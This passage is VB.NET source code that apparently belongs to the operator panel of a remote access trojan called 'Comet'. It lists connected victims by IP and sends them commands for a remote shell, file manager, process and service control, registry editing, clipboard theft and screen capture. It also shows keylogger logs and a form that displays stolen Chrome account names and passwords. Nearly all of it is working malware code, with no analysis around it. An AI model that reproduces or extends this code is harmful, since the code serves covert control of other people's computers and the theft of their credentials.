itm.Text.EndsWith(".RMVB") Then
                                itm.ImageIndex = 11
                            ElseIf itm.Text.EndsWith(".mp3") Or itm.Text.EndsWith(".MP3") Or itm.Text.EndsWith(".it") Or itm.Text.EndsWith(".IT") Or itm.Text.EndsWith(".asx") Or itm.Text.EndsWith(".ASX") Or itm.Text.EndsWith(".au") Or itm.Text.EndsWith(".AU") Or itm.Text.EndsWith(".mid") Or itm.Text.EndsWith(".MID") Or itm.Text.EndsWith(".midi") Or itm.Text.EndsWith(".MIDI") Or itm.Text.EndsWith(".snd") Or itm.Text.EndsWith(".SND") Or itm.Text.EndsWith(".wma") Or itm.Text.EndsWith(".WMA") Or itm.Text.EndsWith(".aiff") Or itm.Text.EndsWith(".AIFF") Or itm.Text.EndsWith(".ogg") Or itm.Text.EndsWith(".OGG") Or itm.Text.EndsWith(".oga") Or itm.Text.EndsWith(".OGA") Or itm.Text.EndsWith(".mka") Or itm.Text.EndsWith(".MKA") Or itm.Text.EndsWith(".m4a") Or itm.Text.EndsWith(".M4A") Or itm.Text.EndsWith(".aac") Or itm.Text.EndsWith(".AAC") Or itm.Text.EndsWith(".flac") Or itm.Text.EndsWith(".FLAC") Or itm.Text.EndsWith(".wv") Or itm.Text.EndsWith(".WV") Or itm.Text.EndsWith(".mpc") Or itm.Text.EndsWith(".MPC") Or itm.Text.EndsWith(".ape") Or itm.Text.EndsWith(".APE") Or itm.Text.EndsWith(".apl") Or itm.Text.EndsWith(".APL") Or itm.Text.EndsWith(".alac") Or itm.Text.EndsWith(".ALAC") Or itm.Text.EndsWith(".tta") Or itm.Text.EndsWith(".TTA") Or itm.Text.EndsWith(".ac3") Or itm.Text.EndsWith(".AC3") Or itm.Text.EndsWith(".dts") Or itm.Text.EndsWith(".DTS") Or itm.Text.EndsWith(".amr") Or itm.Text.EndsWith(".AMR") Or itm.Text.EndsWith(".ra") Or itm.Text.EndsWith(".RA") Or itm.Text.EndsWith(".wav") Or itm.Text.EndsWith(".WAV") Or itm.Text.EndsWith(".mpcpl") Or itm.Text.EndsWith(".MPCPL") Or itm.Text.EndsWith(".m3u") Or itm.Text.EndsWith(".M3U") Or itm.Text.EndsWith(".pls") Or itm.Text.EndsWith(".PLS") Then
                                itm.ImageIndex = 10
                            ElseIf itm.Text.EndsWith(".lnk") Or itm.Text.EndsWith(".LNK") Then
                                itm.ImageIndex = 12
                            ElseIf itm.Text.EndsWith(".bin") Or itm.Text.EndsWith(".BIN") Or itm.Text.EndsWith(".bak") Or itm.Text.EndsWith(".BAK") Or itm.Text.EndsWith(".dat") Or itm.Text.EndsWith(".DAT") Then
                                itm.ImageIndex = 13
                            ElseIf itm.Text.EndsWith(".xlsx") Or itm.Text.EndsWith(".XLSX") Or itm.Text.EndsWith(".xlsm") Or itm.Text.EndsWith(".XLSM") Or itm.Text.EndsWith(".xlsb") Or itm.Text.EndsWith(".XLSB") Or itm.Text.EndsWith(".xltm") Or itm.Text.EndsWith(".XLTM") Or itm.Text.EndsWith(".xlam") Or itm.Text.EndsWith(".XLAM") Or itm.Text.EndsWith(".xltx") Or itm.Text.EndsWith(".XLTX") Or itm.Text.EndsWith(".xll") Or itm.Text.EndsWith(".XLL") Then
                                itm.ImageIndex = 14
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".DOC") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".RTF") Or itm.Text.EndsWith(".docx") Or itm.Text.EndsWith(".DOCX") Or itm.Text.EndsWith(".docm") Or itm.Text.EndsWith(".DOCM") Or itm.Text.EndsWith(".psw") Or itm.Text.EndsWith(".PSW") Or itm.Text.EndsWith(".dot") Or itm.Text.EndsWith(".DOT") Or itm.Text.EndsWith(".dotx") Or itm.Text.EndsWith(".DOTX") Or itm.Text.EndsWith(".dotm") Or itm.Text.EndsWith(".DOTM") Then
                                itm.ImageIndex = 15
                            ElseIf itm.Text.EndsWith(".ini") Or itm.Text.EndsWith(".INI") Or itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".SYS") Or itm.Text.EndsWith(".css") Or itm.Text.EndsWith(".CSS") Or itm.Text.EndsWith(".inf") Or itm.Text.EndsWith(".INF") Then
                                itm.ImageIndex = 16
                            ElseIf itm.Text.EndsWith(".pdf") Or itm.Text.EndsWith(".PDF") Then
                                itm.ImageIndex = 17
                            ElseIf itm.Text.EndsWith(".pptx") Or itm.Text.EndsWith(".PPTX") Or itm.Text.EndsWith(".ppt") Or itm.Text.EndsWith(".PPT") Or itm.Text.EndsWith(".pps") Or itm.Text.EndsWith(".PPS") Or itm.Text.EndsWith(".pptm") Or itm.Text.EndsWith(".PPTM") Or itm.Text.EndsWith(".potx") Or itm.Text.EndsWith(".POTX") Or itm.Text.EndsWith(".potm") Or itm.Text.EndsWith(".POTM") Or itm.Text.EndsWith(".ppam") Or itm.Text.EndsWith(".PPAM") Or itm.Text.EndsWith(".ppsx") Or itm.Text.EndsWith(".PPSX") Or itm.Text.EndsWith(".ppsm") Or itm.Text.EndsWith(".PPSM") Then
                                itm.ImageIndex = 18
                            ElseIf itm.Text.EndsWith(".swf") Or itm.Text.EndsWith(".SWF") Or itm.Text.EndsWith(".htm") Or itm.Text.EndsWith(".HTM") Or itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".HTML") Then
                                itm.ImageIndex = 20
                            ElseIf itm.Text.EndsWith(".reg") Or itm.Text.EndsWith(".REG") Then
                                itm.ImageIndex = 19
                            ElseIf itm.Text.EndsWith(".AACCDB") Or itm.Text.EndsWith(".aaccdb") Or itm.Text.EndsWith(".ACCDE") Or itm.Text.EndsWith(".accde") Or itm.Text.EndsWith(".ACCDT") Or itm.Text.EndsWith(".accdt") Or itm.Text.EndsWith(".ACCDR") Or itm.Text.EndsWith(".accdr") Then
                                itm.ImageIndex = 21
                            ElseIf itm.Text.EndsWith(".xml") Or itm.Text.EndsWith(".XML") Then
                                itm.ImageIndex = 22
                            ElseIf itm.Text.EndsWith(".odt") Or itm.Text.EndsWith(".ODT") Or itm.Text.EndsWith(".ott") Or itm.Text.EndsWith(".OTT") Or itm.Text.EndsWith(".sxw") Or itm.Text.EndsWith(".SXW") Or itm.Text.EndsWith(".stw") Or itm.Text.EndsWith(".STW") Or itm.Text.EndsWith(".sor") Or itm.Text.EndsWith(".SOR") Or itm.Text.EndsWith(".sxc") Or itm.Text.EndsWith(".SXC") Or itm.Text.EndsWith(".stc") Or itm.Text.EndsWith(".STC") Or itm.Text.EndsWith(".sxi") Or itm.Text.EndsWith(".SXI") Or itm.Text.EndsWith(".sti") Or itm.Text.EndsWith(".STI") Or itm.Text.EndsWith(".sxd") Or itm.Text.EndsWith(".SXD") Or itm.Text.EndsWith(".std") Or itm.Text.EndsWith(".STD") Or itm.Text.EndsWith(".sxg") Or itm.Text.EndsWith(".SXG") Then
                                itm.ImageIndex = 23
                            ElseIf itm.Text.EndsWith(".temp") Or itm.Text.EndsWith(".TEMP") Or itm.Text.EndsWith(".tmp") Or itm.Text.EndsWith(".TMP") Then
                                itm.ImageIndex = 24
                            ElseIf itm.Text.EndsWith(".iso") Or itm.Text.EndsWith(".ISO") Then
                                itm.ImageIndex = 25
                            ElseIf itm.Text.EndsWith(".save") Or itm.Text.EndsWith(".SAVE") Or itm.Text.EndsWith(".sav") Or itm.Text.EndsWith(".SAV") Then
                                itm.ImageIndex = 26
                            ElseIf itm.Text.EndsWith(".crt") Or itm.Text.EndsWith(".CRT") Then
                                itm.ImageIndex = 27
                            ElseIf itm.Text.EndsWith(".js") Or itm.Text.EndsWith(".JS") Then
                                itm.ImageIndex = 28
                            ElseIf itm.Text.EndsWith(".cat") Or itm.Text.EndsWith(".CAT") Then
                                itm.ImageIndex = 29
                            ElseIf itm.Text.EndsWith(".chm") Or itm.Text.EndsWith(".CHM") Then
                                itm.ImageIndex = 30
                            ElseIf itm.Text.EndsWith(".vmdk") Or itm.Text.EndsWith(".VMDK") Then
                                itm.ImageIndex = 31
                            ElseIf itm.Text.EndsWith(".vmx") Or itm.Text.EndsWith(".VMX") Then
                                itm.ImageIndex = 32
                            ElseIf itm.Text.EndsWith(".vbs") Or itm.Text.EndsWith(".VBS") Or itm.Text.EndsWith(".vbe") Or itm.Text.EndsWith(".VBE") Or itm.Text.EndsWith(".wsf") Or itm.Text.EndsWith(".WSF") Or itm.Text.EndsWith(".wsc") Or itm.Text.EndsWith(".WSC") Then
                                itm.ImageIndex = 33
                            ElseIf itm.Text.EndsWith(".nfo") Or itm.Text.EndsWith(".NFO") Then
                                itm.ImageIndex = 34
                            ElseIf itm.Text.EndsWith(".sln") Or itm.Text.EndsWith(".SLN") Then
                                itm.ImageIndex = 35
                            ElseIf itm.Text.EndsWith(".vb") Or itm.Text.EndsWith(".VB") Then
                                itm.ImageIndex = 36
                            ElseIf itm.Text.EndsWith(".resx") Or itm.Text.EndsWith(".RESX") Then
                                itm.ImageIndex = 37
                            ElseIf itm.Text.EndsWith(".config") Or itm.Text.EndsWith(".CONFIG") Then
                                itm.ImageIndex = 38
                            ElseIf itm.Text.EndsWith(".vbproj") Or itm.Text.EndsWith(".VBPROJ") Then
                                itm.ImageIndex = 39
                            ElseIf itm.Text.EndsWith(".settings") Or itm.Text.EndsWith(".SETTINGS") Then
                                itm.ImageIndex = 40
                            ElseIf itm.Text.EndsWith(".user") Or itm.Text.EndsWith(".USER") Or itm.Text.EndsWith(".suo") Or itm.Text.EndsWith(".SUO") Then
                                itm.ImageIndex = 41
                            ElseIf itm.Text.EndsWith(".pdb") Or itm.Text.EndsWith(".PDB") Then
                                itm.ImageIndex = 42
                            ElseIf itm.Text.EndsWith(".xslt") Or itm.Text.EndsWith(".XSLT") Then
                                itm.ImageIndex = 43
                            ElseIf itm.Text.EndsWith(".obj") Or itm.Text.EndsWith(".OBJ") Then
                                itm.ImageIndex = 44
                            ElseIf itm.Text.EndsWith(".rc") Or itm.Text.EndsWith(".RC") Then
                                itm.ImageIndex = 45
                            ElseIf itm.Text.EndsWith(".inc") Or itm.Text.EndsWith(".INC") Or itm.Text.EndsWith(".lst") Or itm.Text.EndsWith(".LST") Then
                                itm.ImageIndex = 46
                            ElseIf itm.Text.EndsWith(".res") Or itm.Text.EndsWith(".RES") Then
                                itm.ImageIndex = 47
                            ElseIf itm.Text.EndsWith(".mdmp") Or itm.Text.EndsWith(".MDMP") Then
                                itm.ImageIndex = 48
                            ElseIf itm.Text.EndsWith(".ResmonCfg") Or itm.Text.EndsWith(".RESMONCFG") Then
                                itm.ImageIndex = 49
                            ElseIf itm.Text.EndsWith(".conf") Or itm.Text.EndsWith(".CONF") Or itm.Text.EndsWith(".leases") Or itm.Text.EndsWith(".LEASES") Then
                                itm.ImageIndex = 50
                            ElseIf itm.Text.EndsWith(".cur") Or itm.Text.EndsWith(".CUR") Then
                                itm.ImageIndex = 51
                            ElseIf itm.Text.EndsWith(".ani") Or itm.Text.EndsWith(".ANI") Then
                                itm.ImageIndex = 52
                            ElseIf itm.Text.EndsWith(".url") Or itm.Text.EndsWith(".URL") Then
                                itm.ImageIndex = 53
                            ElseIf itm.Text.EndsWith(".ttf") Or itm.Text.EndsWith(".TTF") Or itm.Text.EndsWith(".otf") Or itm.Text.EndsWith(".OTF") Then
                                itm.ImageIndex = 54
                            ElseIf itm.Text.EndsWith(".blend") Or itm.Text.EndsWith(".BLEND") Then
                                itm.ImageIndex = 55
                            ElseIf itm.Text.EndsWith(".icc") Or itm.Text.EndsWith(".ICC") Then
                                itm.ImageIndex = 56
                            ElseIf itm.Text.EndsWith(".a3x") Or itm.Text.EndsWith(".A3X") Or itm.Text.EndsWith(".au3") Or itm.Text.EndsWith(".AU3") Then
                                itm.ImageIndex = 57
                            Else
                                itm.ImageIndex = 8
                            End If
                            fff.ListView1.Items.Add(itm)
                            i += 1

                        Next
                        My.Computer.Audio.Play("C:\Windows\Media\Windows Navigation Start.wav", AudioPlayMode.Background)

                    End If

                Case "!"
                    If My.Application.OpenForms("!" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim f As New Form28
                    f.F = Me
                    f.xxx = xxx
                    f.Name = "!" & xxx
                    f.UODNNXMATTYW = New Size(A(1), A(2))
                    colordblak()
                    f.Show()

                    f.Text = f.Text & S.IP(xxx)
                Case "@" '
                    Dim F As Form28 = My.Application.OpenForms("!" & xxx)
                    If F IsNot Nothing Then

                        If A(1).Length = 1 Then
                            F.LinkLabel1.Text = "Size: " & siz(B.Length) & " (Indolence)"

                            If F.Button1.Text = "  " Then

                                S.Send(xxx, "@" & Yy & F.C1.SelectedIndex & Yy & F.C2.Text & Yy & F.C.Value)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(B, "@" & Yy)(1)
                        F.PktToImage(BB)


                    End If
                Case "@@" '
                    Dim BB As Byte() = fx(B, "@@" & Yy)(1)
                Case "edittextfile"
                    If My.Application.OpenForms("Text_Editor" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim texter As New Form39
                    texter.xxx = xxx
                    texter.Name = "Text_Editor" & xxx
                    texter.Text = texter.Text & " " & A(1) & " " & S.IP(xxx)
                    texter.pathoftext = A(1)
                    texter.TextBox1.Text = A(2)
                    colordblak()
                    texter.Show()
                Case "getpath"
                    Dim fff As Form5 = My.Application.OpenForms("\\" & xxx)
                    fff.TextBox1.Text = A(1)
                    S.Send(xxx, "FileManager" & Yy & A(1))
                Case "downloadedfile"
                    IO.File.WriteAllBytes(Application.StartupPath & "\Downloads\" & A(2), Convert.FromBase64String(A(1)))

                    Thread.Sleep(1000)
                Case "openshell"
                    If My.Application.OpenForms("openshell" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim fm As New Form36

                    fm.xxx = xxx
                    fm.Name = "openshell" & xxx
                    fm.Text = fm.Text & S.IP(xxx)
                    colordblak()

                    fm.Show()


                Case "rs"
                    Dim sh As Form36 = My.Application.OpenForms("openshell" & xxx)

                    sh.RichTextBox1.AppendText(DEB(A(1)) & vbNewLine)
                Case "rsc"
                    Dim sh As Form36 = My.Application.OpenForms("openshell" & xxx)
                    sh.Close()


                Case "xox"

                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    If My.Application.OpenForms("logeronline" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim f As New Form31
                    f.xxx = xxx
                    Dim Remios = (Application.StartupPath & "/bookbinder/" & (L1.Items.Item(L1.FocusedItem.Index).SubItems.Item(0).Text) + "\logonline.log")
                    Dim XS$ = A(1)
                    My.Computer.FileSystem.WriteAllText(Remios, XS, False)
                    'If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                    '    S.Disconnect(xxx)
                    'End If
                    'Dim fProc As Form31 = My.Application.OpenForms("logeronline" & xxx)
                    'fProc.RichTextBox1.Text = A(1)

                Case "OpenPro"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    If My.Application.OpenForms("OpenPro" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim f As New Form35
                    f.xxx = xxx
                    f.Name = "OpenPro" & xxx
                    f.Text = f.Text & " | " & A(1)
                    colordblak()
                    f.Show()

                Case "ProcessManager"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    Dim fProc As Form35 = My.Application.OpenForms("OpenPro" & xxx)
                    fProc.Enabled = False
                    Dim allProcess As String() = Split(A(1), "ProcessSplit")
                    For Each x In allProcess
                        If Not x = "" Then
                            Dim xx As String() = Split(x, "|")
                            Dim itm As New ListViewItem
                            itm.Text = xx(0)
                            itm.SubItems.Add(xx(1))
                            If xx(2) = "-" Then xx(2) = "System"
                            itm.SubItems.Add(xx(2))
                            itm.SubItems.Add(FormatNumber(Math.Round(xx(3) / 1024), 0))
                            If xx(4) = "-" Then xx(4) = "With Windows"
                            itm.SubItems.Add(xx(4))
                            'If xx(5) = "|" Then xx(5) = " "
                            itm.SubItems.Add(xx(5))
                            itm.SubItems.Add(xx(6))
                            itm.SubItems.Add(xx(7))
                            itm.SubItems.Add(xx(8))
                            itm.SubItems.Add(xx(9))
                            itm.SubItems.Add(xx(10))
                            itm.SubItems.Add(xx(11))
                            itm.SubItems.Add(xx(12))
                            fProc.scream01.Text = "Cup : " + xx(13)
                            'MsgBox(xx(5))
                            itm.ImageIndex = 0
                            fProc.PListView.Items.Add(itm)
                        End If
                    Next
                    fProc.PListView.FindItemWithText(A(2)).BackColor = Color.DarkKhaki
                    fProc.PListView.FindItemWithText(A(2)).ForeColor = Color.DarkOliveGreen
                    fProc.Enabled = True

                    '''''''''''''''''''''
                Case "TETE"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    If My.Application.OpenForms("TETE" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim f As New Form12
                    f.xxx = xxx
                    f.Name = "TETE" & xxx
                    f.Text = f.Text & " | " & A(1)
                    colordblak()
                    f.Show()

                    ''''''''''''''''''''
                Case "ports"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    If My.Application.OpenForms("ports" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim f As New Form26
                    f.xxx = xxx
                    f.Name = "ports" & xxx
                    f.Text = f.Text & " | " & A(1)
                    colordblak()
                    f.Show()



                Case "poka"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    Dim fProc As Form26 = My.Application.OpenForms("ports" & xxx)
                    fProc.Enabled = False
                    Dim allProcess As String() = Split(A(1), "ProcessSplit")
                    For Each x In allProcess
                        If Not x = "" Then
                            Dim xx As String() = Split(x, "|")
                            Dim itm As New ListViewItem
                            itm.Text = xx(0)
                            itm.SubItems.Add(xx(1))
                            itm.SubItems.Add(xx(2))
                            itm.SubItems.Add(xx(3))
                            itm.ImageIndex = 0
                            fProc.ListView1.Items.Add(itm)

                        End If
                    Next
                    fProc.Enabled = True

                Case "ss"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    If My.Application.OpenForms("ss" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim f As New Form40
                    f.xxx = xxx
                    f.Name = "ss" & xxx
                    f.Text = f.Text & " | " & A(1)
                    colordblak()
                    f.Show()


                Case "life is Beautiful"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    If My.Application.OpenForms("life is Beautiful" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim f As New Form41
                    f.xxx = xxx
                    f.Name = "life is Beautiful" & xxx
                    f.Text = f.Text & " | " & A(1)
                    colordblak()
                    f.Show()


                Case "Acti"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    If My.Application.OpenForms("Acti" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim f As New Form42
                    f.xxx = xxx
                    f.Name = "Acti" & xxx
                    f.Text = f.Text & " | " & A(1)
                    colordblak()
                    f.Show()

                Case "00000000000000000000000"

                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    Dim fProc As Form41 = My.Application.OpenForms("life is Beautiful" & xxx)
                    fProc.RichTextBox1.Text = A(1)


                Case "ACs"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    Dim fProc As Form42 = My.Application.OpenForms("Acti" & xxx)

                    Dim allProcess As String() = Split(A(1), "ProcessSplit")
                    For Each x In allProcess
                        If Not x = "" Then


                            Dim xx As String() = Split(x, "|")
                            Dim itm As New ListViewItem
                            itm.Text = xx(0)
                            itm.SubItems.Add(xx(0))
                            itm.ImageIndex = 0
                            fProc.ListView1.Items.Add(itm)

                        End If
                    Next

                Case "serrrrr"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    Dim fProc As Form40 = My.Application.OpenForms("ss" & xxx)

                    Dim allProcess As String() = Split(A(1), "ProcessSplit")
                    For Each x In allProcess
                        If Not x = "" Then


                            Dim xx As String() = Split(x, "|")
                            Dim itm As New ListViewItem
                            itm.Text = xx(0)
                            itm.SubItems.Add(xx(1))

                            itm.SubItems.Add(xx(2))
                            itm.SubItems.Add(xx(3))

                            itm.ImageIndex = 0
                            fProc.lvServices.Items.Add(itm)

                        End If
                    Next






                    '''''''''''''''''''''''''''''''



                Case "cc"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    If My.Application.OpenForms("cc" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim f As New Form16
                    f.xxx = xxx
                    f.Name = "cc" & xxx
                    f.Text = f.Text & " | " & A(1)
                    colordblak()
                    f.Show()


                Case "xxz"
                    If L1.FindItemWithText(S.IP(xxx)) Is Nothing Then
                        S.Disconnect(xxx)
                    End If
                    Dim fProc As Form16 = My.Application.OpenForms("cc" & xxx)
                    fProc.Enabled = False
                    Dim allProcess As String() = Split(A(1), "ProcessSplit")
                    For Each x In allProcess
                        If Not x = "" Then


                            Dim xx As String() = Split(x, "|")
                            Dim itm As New ListViewItem
                            itm.Text = xx(0)
                            itm.SubItems.Add(xx(1))
                            itm.SubItems.Add(xx(2))
                            itm.SubItems.Add(xx(3))

                            itm.SubItems.Add(xx(4))
                            itm.ImageIndex = 0
                            fProc.ListView1.Items.Add(itm)
                        End If
                    Next

                    fProc.Enabled = True

                Case "ppww"
                    Dim f As Form34 = My.Application.OpenForms("++" & xxx)

                    Try
                        f.RichTextBox1.Text = A(1)
                        Dim eraoisds As Integer = f.RichTextBox1.Find("link: --->", 1, RichTextBoxFinds.None)
                        Do While eraoisds > -0
                            f.RichTextBox1.Select(eraoisds, "link: --->".Length)
                            f.RichTextBox1.SelectionColor = Color.ForestGreen
                            eraoisds = f.RichTextBox1.Find("link: --->", eraoisds + "link: --->".Length, RichTextBoxFinds.None)
                            Application.DoEvents()
                            f.RichTextBox1.HideSelection = True
                        Loop

                        Dim eraoisdss As Integer = f.RichTextBox1.Find("Account: --->", 1, RichTextBoxFinds.None)
                        Do While eraoisdss > -0
                            f.RichTextBox1.Select(eraoisdss, "Account: --->".Length)
                            f.RichTextBox1.SelectionColor = Color.ForestGreen
                            eraoisdss = f.RichTextBox1.Find("Account: --->", eraoisdss + "Account: --->".Length, RichTextBoxFinds.None)
                            Application.DoEvents()
                            f.RichTextBox1.HideSelection = True
                        Loop

                        Dim eraoisdsse As Integer = f.RichTextBox1.Find("password: --->", 1, RichTextBoxFinds.None)
                        Do While eraoisdsse > -0
                            f.RichTextBox1.Select(eraoisdsse, "password: --->".Length)
                            f.RichTextBox1.SelectionColor = Color.ForestGreen
                            eraoisdsse = f.RichTextBox1.Find("password: --->", eraoisdsse + "password: --->".Length, RichTextBoxFinds.None)
                            Application.DoEvents()
                            f.RichTextBox1.HideSelection = True
                        Loop

                        Dim eraoisdsse5 As Integer = f.RichTextBox1.Find("============ Chrome ==============", 1, RichTextBoxFinds.None)
                        Do While eraoisdsse5 > -0
                            f.RichTextBox1.Select(eraoisdsse5, "============ Chrome ==============".Length)
                            f.RichTextBox1.SelectionColor = Color.DimGray
                            eraoisdsse5 = f.RichTextBox1.Find("============ Chrome ==============", eraoisdsse5 + "============ Chrome ==============".Length, RichTextBoxFinds.None)
                            Application.DoEvents()
                            f.RichTextBox1.HideSelection = True
                        Loop


                    Catch ex As Exception
                    End Try
                Case "++"
                    If My.Application.OpenForms("++" & xxx) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {xxx, B})
                        Exit Sub
                    End If
                    Dim fm As New Form34
                    fm.xxx = xxx
                    fm.Name = "++" & xxx
                    fm.Text = "Password" & " - " & S.IP(xxx)
                    colordblak()
                    fm.Show()
                    S.Send(xxx, "ppww")

            End Select
        Catch ex As Exception
        End Try
    End Sub
#End Region

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Me.Text = "Comet v 0.1.4.0 - Users Online [ x ]".Replace("x", L1.Items.Count)

        ToolStripStatusLabel1.Text = "Selected(" & L1.SelectedItems.Count & ")"
        If L1.SelectedItems.Count = 0 Then
            Form11.Panel2.Enabled = False
            ContextMenuStrip1.Enabled = False
            PictureBox2.Hide()
            PictureBox1.ImageLocation = "IOS\Ls.png"
            PictureBox3.Hide()

            VisualStudioTabControl2.HorizontalLineColour = System.Drawing.SystemColors.ControlDark
            VisualStudioTabControl2.ActiveColour = System.Drawing.SystemColors.ControlDark
            SplitContainer2.BackColor = System.Drawing.SystemColors.ControlDark
            SplitContainer3.BackColor = System.Drawing.SystemColors.ControlDark
            Me.ShowIcon = False
            Me.ShowIcon = True


        Else

            VisualStudioTabControl2.HorizontalLineColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(122, Byte), Integer), CType(CType(204, Byte), Integer))

            VisualStudioTabControl2.ActiveColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(122, Byte), Integer), CType(CType(204, Byte), Integer))
            SplitContainer2.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(122, Byte), Integer), CType(CType(204, Byte), Integer))
            SplitContainer3.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(122, Byte), Integer), CType(CType(204, Byte), Integer))

            Me.ShowIcon = False
            Me.ShowIcon = True
            ContextMenuStrip1.Enabled = True
            Form11.Panel2.Enabled = True
            PictureBox3.Show()


        End If



        If L1.SelectedItems.Count >= 2 Then
            Form11.Button2.Enabled = False
            PictureBox3.Hide()

            PictureBox2.Hide()
            JToolStripMenuItem.Enabled = False
            OpenDownloadFolderToolStripMenuItem.Enabled = False
            CommentsToolStripMenuItem.Enabled = False
        Else
            CommentsToolStripMenuItem.Enabled = True
            OpenDownloadFolderToolStripMenuItem.Enabled = True
            JToolStripMenuItem.Enabled = True
            Form11.Button2.Enabled = True
        End If







        For Each Process As ListViewItem In GClass91.Items


            If Process.Text.Contains("User Login") Then
                Process.ImageIndex = 1
            ElseIf Process.Text.Contains("The user logs off") Then
                Process.ImageIndex = 0

            End If

        Next









        TextBox1.Text = Kys.Key




    End Sub

    Private Sub JToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles JToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "\\")
            colord()
        Next
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "OpenPro")
            colord()
        Next
    End Sub

    Private Sub RemoteShellToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteShellToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openshell")
            colord()
        Next
    End Sub

    Private Sub RegeditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RegeditToolStripMenuItem.Click
        Try

            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "openRG" & "|U|")
                colord()
            Next
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub GetClipBoardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetClipBoardToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "clipss")
        Next
    End Sub

    Private Sub InformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InformationToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Timer1.Start()
            S.Send(x.ToolTipText, "sendinformation")
        Next
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        pinger = pinger + 1

    End Sub
    Private Sub L1_Click(ByVal sender As Object, ByVal e As System.EventArgs)
